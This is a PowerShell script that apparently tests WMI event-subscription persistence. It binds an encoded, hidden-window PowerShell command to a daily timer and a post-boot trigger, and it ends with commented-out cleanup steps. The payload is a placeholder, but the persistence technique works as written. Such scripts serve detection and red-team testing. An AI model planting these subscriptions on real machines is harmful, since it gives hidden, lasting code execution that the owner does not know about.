$maliciousCommand = 'powershell.exe -w 1 -enc whatever_else'


$testEvent = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{
    name='testEvent'; 
    CommandLineTemplate=$maliciousCommand; 
    RunInteractively='false';
};


$timeTriggerQuery = "SELECT * FROM __instanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40";
$testTimeTrigger = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
    name='testTimeTrigger';
    EventNameSpace='root\CimV2';
    QueryLanguage='WQL';
    Query=$timeTriggerQuery;
};


Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter=$testTimeTrigger; 
    Consumer=$testEvent;
};


$uptimeTriggerQuery = "SELECT * FROM __instanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 400";
$testUptimeTrigger = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
    name='testUptimeTrigger';
    EventNameSpace='root\CimV2';
    QueryLanguage='WQL';
    Query=$uptimeTriggerQuery;
};


Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter=$testUptimeTrigger; 
    Consumer=$testEvent;
};



#cleanup commands
#Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='testEvent'" | Remove-WmiObject;
#Get-WmiObject __eventFilter -Namespace root\subscription -filter "name='testTimeTrigger'" | Remove-WmiObject;
#Get-WmiObject __eventFilter -Namespace root\subscription -filter "name='testUptimeTrigger'" | Remove-WmiObject;

